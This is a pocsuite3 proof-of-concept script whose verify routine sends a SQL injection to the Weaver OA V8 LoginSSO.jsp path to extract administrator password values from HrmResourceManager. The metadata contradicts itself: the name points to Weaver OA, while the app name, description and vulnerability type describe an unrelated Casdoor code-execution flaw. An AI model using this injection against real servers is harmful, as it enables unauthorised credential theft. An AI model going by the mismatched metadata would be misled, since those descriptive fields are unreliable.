from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微OA-V8 注入'
    appName = 'Casdoor'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Casdoor 1.13.1 之前存在安全漏洞，该漏洞允许攻击者通过api/get-organizations进行攻击。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/upgrade/detail.jsp/login/LoginSSO.jsp?id=1 UNION SELECT password as id from HrmResourceManager"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "<code>" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)